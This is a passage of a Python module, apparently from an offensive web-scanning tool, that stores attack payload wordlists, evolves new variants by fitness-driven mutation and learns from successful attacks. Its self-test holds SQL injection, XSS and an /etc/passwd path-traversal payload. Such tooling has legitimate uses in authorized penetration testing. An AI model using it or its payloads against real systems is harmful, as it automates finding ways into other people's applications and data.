            stats['by_vuln_type'][vuln_type] = {
                'total': len(payloads),
                'learned': learned,
                'mutated': mutated,
                'avg_fitness': round(avg_fitness, 3),
            }

        return stats

    def evolve_wordlist(self, vuln_type: str,
                       fitness_scores: Dict[str, float] = None,
                       max_new_payloads: int = 50) -> int:
        """
        Evolve a vulnerability's wordlist based on fitness.

        Args:
            vuln_type: Vulnerability type
            fitness_scores: External fitness scores {payload: score}
            max_new_payloads: Max new payloads to generate

        Returns:
            Number of new payloads added
        """
        if vuln_type not in self.payloads:
            return 0

        # Get current payloads and their fitness
        current_payloads = []
        scores = {}

        for lp in self.payloads[vuln_type].values():
            current_payloads.append(lp.payload)
            # Use provided scores or internal fitness
            if fitness_scores and lp.payload in fitness_scores:
                scores[lp.payload] = fitness_scores[lp.payload]
            else:
                scores[lp.payload] = lp.fitness_score

        # Evolve population
        offspring = self.mutation_engine.evolve_population(
            payloads=current_payloads,
            fitness_scores=scores,
            vuln_type=vuln_type,
            max_offspring=max_new_payloads
        )

        # Add new payloads
        added = 0
        for payload in offspring:
            is_new = self.add_payload(
                payload=payload,
                vuln_type=vuln_type,
                fitness_score=0.5,  # Start at neutral fitness
                source="mutated",
                mutation_operator="evolved"
            )
            if is_new:
                added += 1

        logger.info(f"Evolved {vuln_type} wordlist: {added} new payloads")
        return added

    def import_payloads(self, payloads: List[str], vuln_type: str,
                       initial_fitness: float = 0.5) -> int:
        """
        Import external payloads into internal wordlist.

        Args:
            payloads: List of payloads to import
            vuln_type: Vulnerability type
            initial_fitness: Initial fitness score

        Returns:
            Number of new payloads imported
        """
        added = 0
        for payload in payloads:
            is_new = self.add_payload(
                payload=payload,
                vuln_type=vuln_type,
                fitness_score=initial_fitness,
                source="imported"
            )
            if is_new:
                added += 1

        logger.info(f"Imported {added} new payloads for {vuln_type}")
        return added

    def prune_low_fitness(self, vuln_type: str = None,
                         min_fitness: float = 0.1,
                         keep_learned: bool = True) -> int:
        """
        Remove low-fitness payloads.

        Args:
            vuln_type: Specific type or None for all
            min_fitness: Minimum fitness to keep
            keep_learned: Always keep originally learned payloads

        Returns:
            Number of payloads removed
        """
        removed = 0
        types_to_prune = [vuln_type] if vuln_type else list(self.payloads.keys())

        for vt in types_to_prune:
            to_remove = []
            for payload_hash, lp in self.payloads[vt].items():
                if lp.fitness_score < min_fitness:
                    if keep_learned and lp.source == "learned":
                        continue
                    to_remove.append(payload_hash)

            for ph in to_remove:
                del self.payloads[vt][ph]
                removed += 1

            if to_remove:
                self._save_wordlist(vt)

        logger.info(f"Pruned {removed} low-fitness payloads")
        return removed

    def clear_wordlist(self, vuln_type: str):
        """Clear all payloads for a vulnerability type"""
        if vuln_type in self.payloads:
            self.payloads[vuln_type].clear()
            filepath = self._get_wordlist_path(vuln_type)
            if filepath.exists():
                filepath.unlink()
            logger.info(f"Cleared wordlist for {vuln_type}")


# =============================================================================
# COMBINED WORDLIST PROVIDER
# =============================================================================

class CombinedWordlistProvider:
    """
    Provides combined payloads from internal + external wordlists.
    Internal payloads are prioritized by fitness.
    """

    def __init__(self, internal_manager: InternalWordlistManager,
                 external_loader = None):
        """
        Initialize combined provider.

        Args:
            internal_manager: InternalWordlistManager instance
            external_loader: External WordlistLoader instance (from payload_manager)
        """
        self.internal = internal_manager
        self.external = external_loader

    def get_payloads(self, vuln_type: str,
                    include_internal: bool = True,
                    include_external: bool = True,
                    internal_limit: int = 100,
                    external_limit: int = 200,
                    deduplicate: bool = True,
                    prioritize_internal: bool = True) -> Generator[str, None, None]:
        """
        Get combined payloads from internal and external sources.

        Args:
            vuln_type: Vulnerability type
            include_internal: Include internal wordlist
            include_external: Include external wordlists
            internal_limit: Max internal payloads
            external_limit: Max external payloads
            deduplicate: Remove duplicates
            prioritize_internal: Yield internal first

        Yields:
            Payload strings
        """
        seen = set()

        def yield_unique(payloads):
            for p in payloads:
                if deduplicate:
                    if p not in seen:
                        seen.add(p)
                        yield p
                else:
                    yield p

        # Internal payloads (high fitness first)
        if include_internal and prioritize_internal:
            internal_payloads = self.internal.get_payloads(
                vuln_type=vuln_type,
                limit=internal_limit,
                sort_by_fitness=True
            )
            yield from yield_unique(internal_payloads)

        # External payloads
        if include_external and self.external:
            count = 0
            for payload in self.external.get_payloads(vuln_type):
                if count >= external_limit:
                    break
                if deduplicate and payload in seen:
                    continue
                seen.add(payload)
                yield payload
                count += 1

        # Internal after external (if not prioritized)
        if include_internal and not prioritize_internal:
            internal_payloads = self.internal.get_payloads(
                vuln_type=vuln_type,
                limit=internal_limit,
                sort_by_fitness=True
            )
            yield from yield_unique(internal_payloads)

    def get_statistics(self) -> Dict:
        """Get combined statistics"""
        stats = {
            'internal': self.internal.get_statistics(),
            'external': {}
        }

        if self.external:
            stats['external'] = {
                'available_sources': self.external.get_available_sources(),
            }

        return stats


# =============================================================================
# MAIN / SELF-TEST
# =============================================================================

if __name__ == "__main__":
    print("""
    Internal Wordlist Manager v4.0

    Features:
    - Persistent storage of learned payloads
    - Evolutionary mutation engine
    - Fitness-based ranking
    - Automatic learning from successful attacks
    - Combines with external wordlists
    """)

    # Self-test
    print("\n[*] Running self-test...")

    # Initialize with temp storage
    import tempfile
    temp_dir = tempfile.mkdtemp()
    manager = InternalWordlistManager(storage_path=Path(temp_dir))

    # Test 1: Add payloads
    print("\n[Test 1] Adding payloads:")
    manager.add_payload("' OR 1=1--", "sqli", fitness_score=0.9)
    manager.add_payload("' UNION SELECT NULL--", "sqli", fitness_score=0.85)
    manager.add_payload("<script>alert(1)</script>", "xss", fitness_score=0.8)
    print(f"  Added payloads: {manager.get_statistics()['total_payloads']}")

    # Test 2: Learn from success
    print("\n[Test 2] Learning from success:")
    added = manager.learn_from_success(
        payload="' OR '1'='1",
        vuln_type="sqli",
        confidence=0.95,
        technique="error-based",
        generate_mutations=True,
        max_mutations=10
    )
    print(f"  New payloads from learning: {added}")

    # Test 3: Get payloads
    print("\n[Test 3] Retrieving payloads:")
    sqli_payloads = manager.get_payloads("sqli", sort_by_fitness=True)
    print(f"  SQLi payloads: {len(sqli_payloads)}")
    for p in sqli_payloads[:5]:
        print(f"    - {p[:50]}...")

    # Test 4: Mutation engine
    print("\n[Test 4] Direct mutations:")
    mutations = manager.mutation_engine.mutate(
        payload="../../../etc/passwd",
        vuln_type="lfi",
        max_mutations=15
    )
    print(f"  Generated {len(mutations)} mutations for LFI payload")
    for m in mutations[:5]:
        print(f"    [{m.operator}] {m.mutated[:40]}...")

    # Test 5: Statistics
    print("\n[Test 5] Statistics:")
    stats = manager.get_statistics()
    print(f"  Total payloads: {stats['total_payloads']}")
    for vt, vt_stats in stats['by_vuln_type'].items():
        print(f"    {vt}: {vt_stats['total']} (learned: {vt_stats['learned']}, mutated: {vt_stats['mutated']})")

    # Cleanup
    import shutil
    shutil.rmtree(temp_dir)

    print("\n[+] Self-test completed!")
